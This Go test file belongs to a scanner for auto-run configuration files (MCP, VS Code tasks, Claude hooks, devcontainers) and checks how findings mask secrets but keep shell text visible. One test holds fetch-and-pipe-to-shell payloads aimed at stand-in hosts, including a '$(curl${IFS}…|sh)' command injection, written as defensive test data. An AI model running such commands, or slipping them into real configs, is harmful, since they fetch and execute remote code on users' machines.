package autorun

import (
	"strings"
	"testing"
)

// namedSecret is recognised by gitleaks only with its name beside it.
const namedSecret = "aB3dE5gH" + "7jK9mN1p" + "Q2rS4tU6"

func TestSecretsNamedByAKeyOrAPreviousElementAreMasked(t *testing.T) {
	v := namedSecret
	cases := []struct{ name, rel, body, want string }{
		{"mcp key", ".mcp.json",
			`{"mcpServers":{"s":{"command":"node","api_key":"` + v + `"}}}`,
			`s: {"command":"node","api_key":"****"}`},
		{"mcp nested", ".mcp.json",
			`{"mcpServers":{"s":{"command":"node","auth":{"token":"` + v + `"}}}}`,
			`s: {"command":"node","auth":{"token":"****"}}`},
		{"mcp --api-key", ".mcp.json",
			`{"mcpServers":{"s":{"command":"node","args":["--api-key","` + v + `"]}}}`,
			`s: {"command":"node","args":["--api-key","****"]}`},
		{"mcp --password", ".mcp.json",
			`{"mcpServers":{"s":{"command":"node","args":["--password","` + v + `"]}}}`,
			`s: {"command":"node","args":["--password","****"]}`},
		{"task key", ".vscode/tasks.json",
			`{"tasks":[{"label":"t","command":"x","apiKey":"` + v + `",` + folderOpen + `}]}`,
			`t: {"command":"x","apiKey":"****","label":"t",` + folderOpen + `}`},
		{"hook header", ".claude/settings.json",
			`{"hooks":{"Stop":[{"type":"command","command":"c","headers":{"X-Api-Key":"` + v + `"}}]}}`,
			`Stop: {"command":"c","headers":{"X-Api-Key":"****"},"type":"command"}`},
		{"devcontainer object", ".devcontainer.json",
			`{"postCreateCommand":{"api_key":"` + v + `"}}`,
			`postCreateCommand: {"api_key":"****"}`},
		{"devcontainer array", ".devcontainer.json",
			`{"postCreateCommand":["run","--token","` + v + `"]}`,
			`postCreateCommand: ["run","--token","****"]`},
		{"env value under a harmless name", ".vscode/tasks.json",
			`{"tasks":[{"label":"t","options":{"env":{"X_API_KEYS":"` + v + `"}},` + folderOpen + `}]}`,
			`t: {"label":"t","options":{"env":{"X_API_KEYS":"****"}},` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			res := run(t, root)
			if len(res.Findings) != 1 {
				t.Fatalf("findings: %v", summarize(res.Findings))
			}
			if got := res.Findings[0].Evidence; got != c.want {
				t.Errorf("got  %s\nwant %s", got, c.want)
			}
		})
	}
}

// A name beside a value does not make shell text a secret.
func TestShellTextUnderASecretNameStaysVisible(t *testing.T) {
	for _, s := range []string{
		"curl1.example|sh",
		"$(curl${IFS}evil1.example|sh)",
		"wget evil1.example; sh p1",
	} {
		root := t.TempDir()
		write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"node","args":["--api-key",`+jsonText(t, s)+`],"token":`+jsonText(t, s)+`}}}`)
		res := run(t, root)
		if len(res.Findings) != 1 || strings.Count(res.Findings[0].Evidence, s) != 2 {
			t.Errorf("%q: %v", s, summarize(res.Findings))
		}
	}
}

// Text passed to the masker with a name beside it counts against the budget.
func TestNamedValuesCountAgainstTheBudget(t *testing.T) {
	var items []string
	for i := 0; i < 2000; i++ {
		items = append(items, `"--api-key","`+strings.Repeat("a1", 200)+`"`)
	}
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"node","args":[`+strings.Join(items, ",")+`]}}}`)
	if res := run(t, root); len(res.Findings) == 0 || res.Findings[0].Evidence != tooManyText {
		t.Errorf("findings: %.300v", summarize(res.Findings))
	}
}

// A name beside a value is not enough when the value may be the program: python3
// -X token evil.py runs evil.py, and node --title=token evil.js runs evil.js.
func TestPathLikeValuesAreNotMaskedByName(t *testing.T) {
	cases := []struct{ name, args, want string }{
		{"python3", `"command":"python3","args":["-X","tok` + `en","evil1a2b3c4d.py"]`, `s: {"command":"python3","args":["-X","tok` + `en","evil1a2b3c4d.py"]}`},
		{"node", `"command":"node","args":["--title=tok` + `en","evil1a2b3c4d.js"]`, `s: {"command":"node","args":["--title=tok` + `en","evil1a2b3c4d.js"]}`},
		{"slash", `"command":"node","args":["--au` + `th","a1b2c3d4/e5f6g7h8i9"]`, `s: {"command":"node","args":["--au` + `th","a1b2c3d4/e5f6g7h8i9"]}`},
		{"backslash", `"command":"node","args":["--auth","a1b2c3d4\\e5f6g7h8i9"]`, `s: {"command":"node","args":["--auth","a1b2c3d4\\e5f6g7h8i9"]}`},
		{"object value", `"command":"node","tok` + `en":"evil1a2b3c4d.js"`, `s: {"command":"node","tok` + `en":"evil1a2b3c4d.js"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".mcp.json", `{"mcpServers":{"s":{`+c.args+`}}}`)
			res := run(t, root)
			if len(res.Findings) != 1 || res.Findings[0].Evidence != c.want {
				t.Errorf("got %v\nwant %s", summarize(res.Findings), c.want)
			}
		})
	}
}
